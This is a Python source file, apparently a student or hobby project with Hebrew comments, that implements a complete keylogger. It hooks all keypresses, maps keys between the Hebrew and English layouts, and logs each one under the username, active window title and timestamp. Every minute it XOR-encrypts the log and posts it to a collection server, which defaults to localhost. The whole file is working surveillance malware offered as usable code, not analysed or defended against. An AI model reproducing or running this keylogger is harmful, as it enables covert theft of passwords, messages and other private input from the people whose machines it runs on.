from datetime import datetime
import keyboard
import pygetwindow as gw
import binascii
import requests
import time
from threading import Thread
import os
import ctypes

class KeyLoggerService:
    def __init__(self):
        self.data_to_send = {}

    def _get_keyboard_language(self):
        """ מזהה את פריסת השפה של המקלדת (עברית / אנגלית) """
        user32 = ctypes.WinDLL("user32", use_last_error=True)
        hwnd = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        klid = user32.GetKeyboardLayout(thread_id)
        return klid & 0xFFFF

    def _convert_key(self, key_name):
        """ ממיר מקש לפי השפה הנוכחית של המקלדת """
        lang = self._get_keyboard_language()

        en_to_hebrew = {
            "a": "ש", "b": "נ", "c": "ב", "d": "ג", "e": "ק", "f": "כ", "g": "ע", "h": "י", "i": "ן", "j": "ח",
            "k": "ל", "l": "ך", "m": "צ", "n": "מ", "o": "ם", "p": "פ", "q": "/", "r": "ר", "s": "ד", "t": "א",
            "u": "ו", "v": "ה", "w": "'", "x": "ס", "y": "ט", "z": "ז", ";": "ף", "'": ",", ",": "ת", ".": "ץ"
        }

        he_to_english = {v: k for k, v in en_to_hebrew.items()}

        if lang == 1037:  # עברית
            return en_to_hebrew.get(key_name, key_name)
        elif lang == 1033:  # אנגלית
            return he_to_english.get(key_name, key_name)
        return key_name

    def _format_key(self, key_name):
        if key_name == "enter":
            return " \n "
        elif key_name == "space":
            return " "
        elif len(key_name) > 1:
            return f" [{key_name}] "
        return key_name

    def on_press(self, event):
        window = gw.getActiveWindow()
        window = window.title if window else "Unknown Window"
        timestamp = datetime.now().strftime("%d/%m/%y %H:%M")
        username = os.getlogin()

        key = self._convert_key(event.name)
        key = self._format_key(key)

        if username not in self.data_to_send:
            self.data_to_send[username] = {}

        if window not in self.data_to_send[username]:
            self.data_to_send[username][window] = {}

        if timestamp not in self.data_to_send[username][window]:
            self.data_to_send[username][window][timestamp] = ""

        self.data_to_send[username][window][timestamp] += key


class XorCipher:
    def __init__(self, key="thisIsMyXorKey"):
        self.key = key

    def encrypt(self, text):
        return binascii.hexlify(self._xor_process(text).encode()).decode()

    def _xor_process(self, text):
        key_cycle = (self.key * ((len(text) // len(self.key)) + 1))[:len(text)]
        return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key_cycle))


class ServerSender:
    def __init__(self, server_url="http://127.0.0.1:5000/data"):
        self.server_url = server_url

    def send_data(self, data):
        try:
            response = requests.post(self.server_url, json=data)
            if response.status_code == 201:
                print("Data sent successfully!")
            else:
                print(f"Failed to send data: {response.status_code}, {response.text}")
        except Exception as err:
            print(f"Error sending data: {err}")


class SendingTimer:
    def __init__(self, server_sender, cipher, key_logger, time_to_send=60):
        self.server_sender = server_sender
        self.cipher = cipher
        self.key_logger = key_logger
        self.time_to_send = time_to_send

    def start_sending_data(self):
        while True:
            if self.key_logger.data_to_send:
                encrypted_data = self._encrypt_data(self.key_logger.data_to_send)
                self.server_sender.send_data(encrypted_data)
                print("Data sent to server.")
                self.key_logger.data_to_send = {}
            time.sleep(self.time_to_send)

    def _encrypt_data(self, data):
        encrypted_data = {}
        for user, windows in data.items():
            encrypted_data[user] = {
                window: {
                    timestamp: self.cipher.encrypt(text)
                    for timestamp, text in timestamps.items()
                }
                for window, timestamps in windows.items()
            }
        return encrypted_data


if __name__ == "__main__":
    server_sender = ServerSender()
    xor_cipher = XorCipher()
    key_logger = KeyLoggerService()
    sending_timer = SendingTimer(server_sender, xor_cipher, key_logger)

    keyboard.on_press(key_logger.on_press)

    send_thread = Thread(target=sending_timer.start_sending_data)
    send_thread.daemon = True
    send_thread.start()
    keyboard.wait()
